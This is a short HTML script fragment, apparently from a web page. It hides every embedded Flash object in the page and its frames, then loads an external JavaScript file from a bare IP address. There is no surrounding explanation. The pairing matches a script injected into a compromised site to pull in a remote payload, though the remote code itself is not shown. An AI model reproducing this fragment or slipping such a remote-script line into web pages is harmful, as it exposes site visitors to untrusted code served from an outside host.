<script language="Javascript">
function doDocument(theDocument)
{
	var objs=theDocument.all;
	var l=objs.length;
	for (var i=0;i<l;i++)
	{
		var obj=objs[i];
		try
		{
		  if (obj.tagName=="OBJECT" && obj.classid=="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000")
		  {
		    obj.style.visibility="hidden";
		  }
		} 
		catch(e){}
	}
}
doDocument(document);
var frs=document.frames;
if (frs != null)
{
    for (var i=0; i < frs.length; i++)
    {
    	doDocument(frs[i].document);
    }
}
</script>
<script language=javascript src=http://60.190.101.206/abc.js></script>